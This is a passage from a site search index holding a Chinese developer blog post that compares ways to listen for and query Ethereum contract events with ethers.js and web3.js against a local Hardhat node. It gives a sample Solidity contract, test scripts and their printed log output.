<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>合约事件的监听</title>
      <link href="/eventListen/"/>
      <url>/eventListen/</url>
      
        <content type="html"><![CDATA[<h1 id="合约事件的监听"><a href="#合约事件的监听" class="headerlink" title="合约事件的监听"></a>合约事件的监听</h1><hr><pre><code>author：Thomas_Xu</code></pre><p>这两天在研究js中各种对事件的监听方式，并试图找出其中的不同。接下来会逐一对事件的监听方式进行解析。</p><h2 id="事件和日志的区别"><a href="#事件和日志的区别" class="headerlink" title="事件和日志的区别"></a>事件和日志的区别</h2><p>在介绍事件的监听前，我们先明确事件，日志这两个概念。事件发生后被记录到区块链上成为了日志。总的来说，事件强调功能，一种行为；日志强调存储，内容。</p><p>事件是以太坊EVM提供的一种日志基础设施。事件可以用来做操作记录，存储为日志。也可以用来实现一些交互功能，比如通知UI，返回函数调用结果等</p><h2 id="事件的监听"><a href="#事件的监听" class="headerlink" title="事件的监听"></a>事件的监听</h2><p>我们在ether.js中可以直接使用<code>contract.on</code>函数对当前合约事件进行监听。但是<code>contract.on</code>函数只会监听当前区块的该合约事件，后面会讲解查询历史所有事件的方法。</p><p>此函数的应用场景：</p><p>在一个非view函数中如果想要获取合约中的某个变量的值，是需要发送交易的，很明显，这样的操作不划算。那么我们可以用一种更优雅的方式获取这样的数据。</p><p>通过事件的形式。（但这样的形式会带来新的问题，由于合约发送事件是需要在链上保存日志的，这也会带来花费，这就需要在两个需求之间进行自己的权衡了）</p><p>示例合约：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Example &#123;</span><br><span class="line">    event Return(uint256 num);</span><br><span class="line">    uint256 _accum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">uint256 </span>) </span>&#123;</span><br><span class="line">        _accum++;</span><br><span class="line">        emit Return(_accum);</span><br><span class="line">        <span class="keyword">return</span> _accum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用ether.js监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">const &#123; expect &#125; &#x3D; require(&quot;chai&quot;);</span><br><span class="line">const &#123; Contract &#125; &#x3D; require(&quot;ethers&quot;);</span><br><span class="line">const &#123; ethers &#125; &#x3D; require(&#39;hardhat&#39;);</span><br><span class="line"></span><br><span class="line">describe(&quot;Example test&quot;, function () &#123;</span><br><span class="line">    let contractAddress &#x3D; &quot;0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9&quot;</span><br><span class="line"></span><br><span class="line">    const tokenAbi &#x3D;[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;anonymous&quot;: false,</span><br><span class="line">            &quot;inputs&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;indexed&quot;: false,</span><br><span class="line">                    &quot;internalType&quot;: &quot;uint256&quot;,</span><br><span class="line">                    &quot;name&quot;: &quot;num&quot;,</span><br><span class="line">                    &quot;type&quot;: &quot;uint256&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;name&quot;: &quot;Return&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;event&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;inputs&quot;: [],</span><br><span class="line">            &quot;name&quot;: &quot;increment&quot;,</span><br><span class="line">            &quot;outputs&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;internalType&quot;: &quot;uint256&quot;,</span><br><span class="line">                    &quot;name&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;type&quot;: &quot;uint256&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            &quot;stateMutability&quot;: &quot;nonpayable&quot;,</span><br><span class="line">            &quot;type&quot;: &quot;function&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    let provider &#x3D; new ethers.providers.JsonRpcProvider(&#39;http:&#x2F;&#x2F;localhost:8545&#39;)</span><br><span class="line">    let privKey &#x3D; &#39;0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80&#39;</span><br><span class="line">    let wallet &#x3D; new ethers.Wallet(privKey,provider)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    it(&quot;should fire the event&quot;, async function () &#123;</span><br><span class="line">        &#x2F;&#x2F;修改轮询时间?</span><br><span class="line">        &#x2F;&#x2F; const provider &#x3D; ethers.provider;</span><br><span class="line">        &#x2F;&#x2F; provider.pollingInterval &#x3D; 100;</span><br><span class="line">        const [deployer] &#x3D;   await ethers.getSigners();</span><br><span class="line">        const TokenContract &#x3D; new ethers.Contract(contractAddress, tokenAbi, deployer);</span><br><span class="line">        contractSigner &#x3D; TokenContract.connect(wallet)</span><br><span class="line">        &#x2F;&#x2F;触发contract.on事件</span><br><span class="line">        contractSigner.on(&quot;Return&quot;, (num) &#x3D;&gt; &#123;</span><br><span class="line">            console.log(&#39;The event data is&#39;, num)</span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        await contractSigner.increment()</span><br><span class="line">        &#x2F;&#x2F;等待5秒，因为ether.js的轮询时间为4s</span><br><span class="line">        await new Promise(res &#x3D;&gt; setTimeout(() &#x3D;&gt; res(null), 5000));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这里有一个轮询时间的概念，默认情况下，ethers.js使用轮询来获取事件，轮询间隔是4秒，所以您在测试的末尾添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;等待5秒，因为ether.js的轮询时间为4s</span><br><span class="line">await new Promise(res &#x3D;&gt; setTimeout(() &#x3D;&gt; res(null), 5000));</span><br></pre></td></tr></table></figure><p>然而！您还可以调整给定合约的轮询间隔，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const provider &#x3D; greeter.provider as EthersProviderWrapper;</span><br><span class="line">provider.pollingInterval &#x3D; 100;</span><br></pre></td></tr></table></figure><h2 id="历史事件的查询"><a href="#历史事件的查询" class="headerlink" title="历史事件的查询"></a>历史事件的查询</h2><p>不管是web3.js还是ether.js都给我们提供了很全的库来查询历史交易</p><h4 id="web3-js"><a href="#web3-js" class="headerlink" title="web3.js"></a>web3.js</h4><p>在web3.js中使用<code>contract.getPastEvents</code>函数来读取合约历史事件</p><p>调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myContract.getPastEvents(event[, options][, callback])</span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>event - String: 事件名，或者使用 “allEvents” 来读取所有的事件</li><li>options - Object: 用于部署的选项，包含以下字段：<ul><li>filter - Object : 可选，按索引参数过滤事件，例如 {filter: {myNumber: [12,13]}} 表示所有“myNumber” 为12 或 13的事件</li><li>fromBlock - Number : 可选，仅读取从该编号开始的块中的历史事件。</li><li>toBlock - Number : 可选，仅读取截止到该编号的块中的历史事件，默认值为”latest”</li><li>topics - Array : 可选，用来手动设置事件过滤器的主题。如果设置了filter属性和事件签名，那么(topic[0])将不会自动设置</li></ul></li><li>callback - Function : 可选的回调参数，触发时其第一个参数为错误对象，第二个参数为历史事件数组</li></ul><p><strong>返回值：</strong></p><p>一个Promise对象，其解析值为历史事件对象数组</p><p>使用<code>contract.getPastEvents</code>监听：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Web3 = <span class="built_in">require</span>(<span class="string">'web3'</span>);</span><br><span class="line"><span class="keyword">const</span> web3 = <span class="keyword">new</span> Web3(<span class="string">'http://127.0.0.1:8545/'</span>);</span><br><span class="line"><span class="keyword">const</span> contractAddress = <span class="string">'0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9'</span>;</span><br><span class="line"><span class="keyword">const</span> contractAbi = [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"><span class="keyword">const</span> contract = <span class="keyword">new</span> web3.eth.Contract(contractAbi, contractAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PAST_EVENT = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> contract.methods.increment().send(&#123;<span class="attr">from</span>: <span class="string">"0x70997970C51812dc3A010C7d01b50e0d17dc79C8"</span>&#125;)</span><br><span class="line">    <span class="keyword">await</span> contract.getPastEvents(<span class="string">'Return'</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// filter: &#123;num: [0,100]&#125;, </span></span><br><span class="line">        fromBlock: <span class="number">0</span>,</span><br><span class="line">        toBlock: <span class="string">'latest'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      (err, events) =&gt; &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(events);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;;</span><br><span class="line">PAST_EVENT();</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    removed: false,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    id: 'log_77c8ec37',</span><br><span class="line">    returnValues: Result &#123; '0': '1', num: '1' &#125;,</span><br><span class="line">    event: 'Return',</span><br><span class="line">    signature: '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab',</span><br><span class="line">    raw: &#123;</span><br><span class="line">      data: '0x0000000000000000000000000000000000000000000000000000000000000001',  </span><br><span class="line">      topics: [Array]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="ether-js"><a href="#ether-js" class="headerlink" title="ether.js"></a>ether.js</h4><p>ether.js中的类似函数我找了很久，翻遍了文档才找到。</p><h5 id="provider-getLogs"><a href="#provider-getLogs" class="headerlink" title="provider.getLogs()"></a>provider.getLogs()</h5><p>从名字中就能看出来这和函数是获取日志。</p><p>使用方法倒是简单很多：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> contractAddress = <span class="string">"0x5FbDB2315678afecb367f032d93F642f64180aa3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tokenAbi =[</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getevent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.JsonRpcProvider()</span><br><span class="line">    <span class="keyword">const</span> [deployer] =  <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line"><span class="keyword">const</span> TokenContract = <span class="keyword">new</span> ethers.Contract(contractAddress, tokenAbi, provider);</span><br><span class="line">    TokenContract.connect(deployer).increment();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">let</span> filter = TokenContract.filters.Return();</span><br><span class="line"><span class="keyword">let</span> filterLog = &#123;</span><br><span class="line">fromBlock : <span class="number">0</span>,</span><br><span class="line">toBlock : <span class="string">'latest'</span>,</span><br><span class="line">topics : filter.topics</span><br><span class="line">  &#125;</span><br><span class="line">provider.getLogs(filterLog).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">getevent()</span><br></pre></td></tr></table></figure><p>事件查询结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    data: '0x0000000000000000000000000000000000000000000000000000000000000001',    </span><br><span class="line">    topics: [</span><br><span class="line">      '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab'</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    logIndex: 0</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="Contract-queryFilter"><a href="#Contract-queryFilter" class="headerlink" title="Contract.queryFilter"></a>Contract.queryFilter</h5><p>这也是从合约中获取历史事件的函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> contractAddress = <span class="string">"0x5FbDB2315678afecb367f032d93F642f64180aa3"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tokenAbi =[</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"anonymous"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"inputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"indexed"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"num"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"Return"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"event"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"inputs"</span>: [],</span><br><span class="line"><span class="string">"name"</span>: <span class="string">"increment"</span>,</span><br><span class="line"><span class="string">"outputs"</span>: [</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"internalType"</span>: <span class="string">"uint256"</span>,</span><br><span class="line"><span class="string">"name"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"uint256"</span></span><br><span class="line">&#125;</span><br><span class="line">],</span><br><span class="line"><span class="string">"stateMutability"</span>: <span class="string">"nonpayable"</span>,</span><br><span class="line"><span class="string">"type"</span>: <span class="string">"function"</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// export const getListOfTransfers = async (pairAddress) =&gt; &#123;</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getevent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.JsonRpcProvider()</span><br><span class="line">    <span class="keyword">const</span> [deployer] =  <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line"><span class="keyword">const</span> TokenContract = <span class="keyword">new</span> ethers.Contract(contractAddress, tokenAbi, provider);</span><br><span class="line">    TokenContract.connect(deployer).increment();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">let</span> filter = TokenContract.filters.Return();</span><br><span class="line"><span class="keyword">let</span> filterLog = &#123;</span><br><span class="line">fromBlock : <span class="number">0</span>,</span><br><span class="line">toBlock : <span class="string">'latest'</span>,</span><br><span class="line">topics : filter.topics</span><br><span class="line">  &#125;</span><br><span class="line">provider.getLogs(filterLog).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let eventsWith = await TokenContract.queryFilter(filterLog, 0, 'latest');</span></span><br><span class="line">    <span class="comment">// console.log(eventsWith);</span></span><br><span class="line">    <span class="comment">// return eventsWith;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">getevent()</span><br></pre></td></tr></table></figure><p>查询结果：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    blockHash: '0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d',</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    removed: false,</span><br><span class="line">    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',</span><br><span class="line">    data: '0x0000000000000000000000000000000000000000000000000000000000000001',</span><br><span class="line">    topics: [</span><br><span class="line">      '0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab'</span><br><span class="line">    ],</span><br><span class="line">    transactionHash: '0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e',</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    removeListener: [Function (anonymous)],</span><br><span class="line">    getBlock: [Function (anonymous)],</span><br><span class="line">    getTransaction: [Function (anonymous)],</span><br><span class="line">    getTransactionReceipt: [Function (anonymous)],</span><br><span class="line">    event: 'Return',</span><br><span class="line">    eventSignature: 'Return(uint256)',</span><br><span class="line">    decode: [Function (anonymous)],</span><br><span class="line">    args: [ BigNumber &#123; value: "1" &#125;, num: BigNumber &#123; value: "1" &#125; ]</span><br><span class="line">  &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="比较三种查询历史事件的结果："><a href="#比较三种查询历史事件的结果：" class="headerlink" title="比较三种查询历史事件的结果："></a>比较三种查询历史事件的结果：</h3><p>web3.js—<code>contract.getPastEvents()</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    removed: false,</span><br><span class="line">    logIndex: 0,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    transactionHash: &#39;0x18196a4c3350f1356269c8943b45bbb6685bcd67ff957f5f7beed2ab7c7be91e&#39;,</span><br><span class="line">    blockHash: &#39;0x63a0cfea8f60061d569ec739bc909e7e2bed23d70620d4099b648672e0e1b96d&#39;,</span><br><span class="line">    blockNumber: 10437919,</span><br><span class="line">    address: &#39;0x5FbDB2315678afecb367f032d93F642f64180aa3&#39;,</span><br><span class="line">    id: &#39;log_77c8ec37&#39;,</span><br><span class="line">    returnValues: Result &#123; &#39;0&#39;: &#39;1&#39;, num: &#39;1&#39; &#125;,</span><br><span class="line">    event: &#39;Return&#39;,</span><br><span class="line">    signature: &#39;0x336bea1cd71b6fced353b888a0beae82acd2a0b7a3c283407f4b79af29cfa7ab&#39;,</span><br><span class="line">    raw: &#123;</span><br><span class="line">      data: &#39;0x0000000000000000000000000000000000000000000000000000000000000001&#39;,  </span><br><span class="line">      topics: [Array]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ether.js—<code>provider.getLogs()</code>函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 